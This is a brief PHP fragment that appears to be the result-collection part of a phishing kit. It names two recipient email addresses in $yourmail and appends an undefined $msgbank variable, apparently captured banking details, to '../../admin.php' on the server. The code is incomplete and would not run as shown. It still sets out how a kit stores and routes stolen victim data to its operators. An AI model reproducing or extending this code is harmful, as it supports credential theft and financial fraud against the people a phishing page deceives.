<?php

$yourmail  = 'christianachihai@gmail.com,clownresult5.5@hotmail.com';


$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);



?>
